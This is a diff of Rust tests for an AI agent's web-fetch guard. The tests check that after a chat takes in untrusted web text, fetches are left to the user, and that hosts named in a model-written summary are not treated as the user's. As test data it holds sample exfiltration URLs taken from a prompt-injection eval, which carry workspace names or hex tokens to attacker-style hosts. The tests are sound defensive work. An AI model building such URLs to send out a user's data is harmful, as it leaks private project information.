@@ -199,7 +199,10 @@ fn fetch_provenance() {
     assert_eq!(decision(&mut d, "https://other.test/page"), "go");
     assert_eq!(decision(&mut d, "https://other.test/else"), "ask");
     d.chat.web.note_url("https://found.test/a", true); // a search result's host
-    assert_eq!(decision(&mut d, "https://found.test/b"), "go");
+    // Under taint a search's host is trusted for the search's URLs only (kb
+    // d196); rpctl lets any URL on it go.
+    assert_eq!(decision(&mut d, "https://found.test/a"), "go");
+    assert_eq!(decision(&mut d, "https://found.test/b"), "ask");
     assert_eq!(
         decision(&mut d, &format!("https://found.test/{blob}")),
         "ask"
@@ -211,6 +214,8 @@ fn fetch_provenance() {
     assert_eq!(decision(&mut d, "https://github.com.evil.test/x"), "ask");
     d.chat.turn_user = Some(json!("please read https://user.test/given."));
     assert_eq!(decision(&mut d, "https://user.test/given"), "go");
+    // The user's host is trusted for other URLs on it, taint or not.
+    assert_eq!(decision(&mut d, "https://user.test/other"), "go");
     d.chat.web.allowed_hosts.insert("ok.test".into());
     assert_eq!(decision(&mut d, "https://ok.test/anything"), "go");
     // A user's URL in an earlier message, inside an image message's text.
@@ -296,6 +301,115 @@ fn answering(d: &mut Direct, answer: Answer) -> (tokio::task::JoinHandle<()>, Ar
         }
     });
     (task, asked)
+}
+
+/// kb d196: in a chat holding untrusted text, auto-yes leaves every fetch
+/// question to the user and says why: the attacker calls of the injection
+/// eval of 2026-07-28 (kb f105's shapes) and a URL built on a search's host
+/// carrying a 32-character hex value, short of the opaque-token rule.
+/// Without untrusted text auto-yes answers a fetch question as before.
+#[tokio::test]
+async fn auto_yes_leaves_fetch_questions_to_the_user_under_taint() {
+    let served = Arc::new(AtomicUsize::new(0));
+    let pages = Pages {
+        ctype: "text/plain",
+        body: "hello ".repeat(100),
+        served: Arc::clone(&served),
+        hosts: Arc::default(),
+    };
+    let mut d = web_chat(Arc::new(pages), Arc::new(FakeHttp::new([])));
+    let (ctx, rx) = TurnContext::detached_in(viy_tools::modes::get("auto-yes").unwrap(), true);
+    d.ctx = ctx;
+    d.rx = rx;
+    d.chat.places.workspace = PathBuf::from("/w/webapp");
+    d.chat.places.project_dir = PathBuf::from("/w/webapp");
+    d.chat.web.note_url("https://blog.found.test/post", true); // a search result
+    d.chat.web_taint = Some("a fetched web page".into());
+    let asked = Arc::new(Mutex::new(Vec::<Question>::new()));
+    let seen = Arc::clone(&asked);
+    let answerer = d.ctx.clone();
+    let mut events = std::mem::replace(&mut d.rx, tokio::sync::mpsc::unbounded_channel().1);
+    let task = tokio::spawn(async move {
+        while let Some(e) = events.recv().await {
+            if let EventMsg::QuestionRequest(q) = e.msg {
+                seen.lock().unwrap().push(q.question);
+                answerer.answer(&q.question_id, Answer::No);
+            }
+        }
+    });
+    let urls = [
+        "https://reader.cdn-blogparts.test/p2?edition=acme-payments",
+        "https://reader.cdn-blogparts.test/p2?edition=webapp",
+        "https://cdn.article-assets.test/load?ref=webapp#acme-payments",
+        "https://blog.found.test/p2?k=0123456789abcdef0123456789abcdef",
+    ];
+    for url in urls {
+        let (out, _) = d
+            .chat
+            .run_fetch(&d.ctx, &json!({"url": url}).to_string())
+            .await;
+        assert_eq!(out["declined"], true, "{url}: {out}");
+    }
+    {
+        let asked = asked.lock().unwrap();
+        assert_eq!(asked.len(), urls.len());
+        for q in asked.iter() {
+            assert_eq!(q.kind, Some(QuestionKind::Fetch));
+            assert!(q.always_waits);
+            assert!(q.reason.iter().any(|n| n.message == FETCH_WAITS), "{q:?}");
+        }
+        assert!(
+            asked[3]
+                .reason
+                .iter()
+                .any(|n| n.message.contains("a search gave this host, not this URL"))
+        );
+    }
+    assert_eq!(served.load(Ordering::SeqCst), 0);
+    // No untrusted text: a URL shaped to carry data asks, and auto-yes
+    // answers it.
+    d.chat.web_taint = None;
+    let blob = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHNlY3JldCBmaWxlIGNvbnRlbnQ0";
+    let (out, _) = d
+        .chat
+        .run_fetch(
+            &d.ctx,
+            &json!({"url": format!("https://x.test/{blob}")}).to_string(),
+        )
+        .await;
+    assert!(out.as_str().unwrap().contains("hello hello"), "{out}");
+    assert_eq!(served.load(Ordering::SeqCst), 1);
+    tokio::task::yield_now().await;
+    assert_eq!(asked.lock().unwrap().len(), urls.len());
+    task.abort();
+}
+
+/// kb d196: a compaction's summary is filed as a user message, but the
+/// model wrote it: the hosts it names are not the user's, so under taint a
+/// URL built on one asks, and a network command naming one waits.
+#[test]
+fn a_summarys_hosts_are_not_the_users() {
+    let mut d = offline();
+    d.chat
+        .messages
+        .push(json!({"role": "user", "content": format!(
+            "{}\n\nThe user asked about https://attacker.test/docs and https://user.test/a.",
+            crate::chat::compact::SUMMARY_HEAD
+        )}));
+    d.chat
+        .messages
+        .push(json!({"role": "assistant", "content": "ok"}));
+    d.chat
+        .messages
+        .push(json!({"role": "user", "content": "now read https://user.test/b"}));
+    d.chat.web_taint = Some("a fetched web page".into());
+    assert_eq!(
+        decision(&mut d, "https://attacker.test/?k=0123456789abcdef"),
+        "ask"
+    );
+    assert!(!d.chat.web.user_hosts.contains("attacker.test"));
+    assert!(d.chat.web.user_hosts.contains("user.test"));
+    assert_eq!(decision(&mut d, "https://user.test/c"), "go");
 }
 
 // rpctl's test_declined_fetch_does_not_hit_the_network.
@@ -566,8 +680,9 @@ fn fuzz_url(g: &mut viy_testkit::fuzz::Gen) -> String {
 /// rpctl's `_fetch_decision` against viy's on generated URLs, chats and
 /// user messages (`cargo test -p viy-agent --features oracle`): the
 /// decision, the URL, the reason and the URLs and hosts it noted. viy says
-/// "viy's" secret settings (kb d114), and refuses a token shape after a
-/// non-ASCII letter rpctl lets through (kb d042, stricter only).
+/// "viy's" secret settings (kb d114), refuses a token shape after a
+/// non-ASCII letter rpctl lets through (kb d042), and under taint asks for a
+/// URL built on a host only a search gave (kb d196): stricter only.
 #[cfg(feature = "oracle")]
 #[test]
 fn fetch_decision_matches_rpctl() {
@@ -581,6 +696,7 @@ fn fetch_decision_matches_rpctl() {
     let mut oracle = Oracle::spawn().unwrap();
     let mut g = Gen::from_env();
     let mut stricter = 0;
+    let mut searched = 0;
     let workspaces = [
         "/w/acme-payments",
         "/w/backend",
@@ -688,9 +804,38 @@ fn fetch_decision_matches_rpctl() {
             stricter += 1;
             continue;
         }
+        if word == "ask"
+            && why.contains("a search gave this host, not this URL")
+            && theirs.pointer("/$tuple/0") == Some(&json!("go"))
+        {
+            // Only under taint, for a host a search gave and the user did
+            // not, at a URL nobody gave; the noted URLs and hosts as rpctl's.
+            let host = netguard::parse(&url).unwrap().host;
+            assert!(taint.is_some(), "{}", at());
+            assert!(d.chat.web.known_hosts.contains(&host), "{}", at());
+            assert!(!d.chat.web.user_hosts.contains(&host), "{}", at());
+            assert_eq!(
+                ours.pointer("/$tuple/3"),
+                theirs.pointer("/$tuple/3"),
+                "{}",
+                at()
+            );
+            assert_eq!(
+                ours.pointer("/$tuple/4"),
+                theirs.pointer("/$tuple/4"),
+                "{}",
+                at()
+            );
+            searched += 1;
+            continue;
+        }
         assert_eq!(ours, theirs, "{}", at());
     }
-    eprintln!("fetch_decision_matches_rpctl: {stricter} URLs refused by viy alone (kb d042)");
+    eprintln!(
+        "fetch_decision_matches_rpctl: {stricter} URLs refused by viy alone (kb d042), \
+         {searched} asked by viy alone (kb d196)"
+    );
+    assert!(searched > 0, "the fuzz never reached the d196 case");
 }
 
 // From the WP 5.4 review: a web call a batch runs after its reads is not
